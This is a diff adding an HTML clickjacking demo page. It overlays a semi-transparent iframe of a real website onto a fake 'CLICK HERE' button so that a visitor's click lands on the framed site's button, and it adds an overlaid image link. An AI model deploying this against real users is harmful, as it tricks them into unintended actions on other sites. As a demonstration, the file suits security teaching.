@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Click Jacking Demo
+        </title>
+        <style>
+            iframe{
+                width:900px;
+                height: 250px;
+                /*Use absolute positioning to line up update button with fake button*/
+                position:absolute;
+                top:-195px;
+                left:-740px;
+                z-index:2;
+                /*hide from view*/
+                -moz-opacity:0.5;
+                opacity:0.5;
+                filter:alpha(opacity=0.5);
+            }
+            button{
+                position:absolute;
+                top:10px;
+                left:10px;
+                z-index: 1;
+                width:120px;
+            }
+        </style>
+
+    </head>
+    <body>
+        <iframe src="http://www.qidian.com" scrolling="no">
+        </iframe>
+        <button>CLICK HERE</button>
+
+        <a href="http://www.baidu.com">
+            <img src="1.png" style="position:absolute;left:100px;top:100px;z-index:2;opacity:0.5;">
+        </a>
+    </body>
+
+</html>
